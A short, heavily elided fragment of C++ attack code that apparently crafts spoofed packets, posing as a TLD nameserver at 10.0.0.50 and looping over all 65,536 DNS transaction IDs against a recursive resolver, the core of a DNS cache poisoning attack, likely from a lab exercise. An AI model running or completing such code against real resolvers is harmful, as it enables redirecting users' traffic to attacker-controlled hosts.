...
int main() {
    ...
    string tld_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be tld DNS)
    ...
    for (int id = 0; id <= 65535; ++id) {
        ...
        IP ip = IP(recursive_ns_ip, tld_ns_ip) / udp;  // Create IP layer targeting recursive DNS server
